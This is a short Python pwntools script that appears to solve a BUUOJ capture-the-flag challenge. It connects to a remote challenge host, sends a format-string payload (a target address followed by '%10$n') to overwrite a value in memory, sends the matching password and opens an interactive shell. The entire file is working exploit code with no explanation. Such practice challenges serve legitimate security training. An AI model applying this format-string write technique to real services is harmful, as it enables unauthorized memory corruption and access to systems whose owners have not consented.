# _*_ coding:utf-8 _*_
from pwn import *
sh=remote('node3.buuoj.cn',25390)
# sh = process('./pwn')
payload = p32(0x804C044)+"aaa%10$n"
sh.recvuntil('name:')
sh.sendline(payload)
sh.recvuntil('passwd:')
sh.sendline("7")
sh.interactive()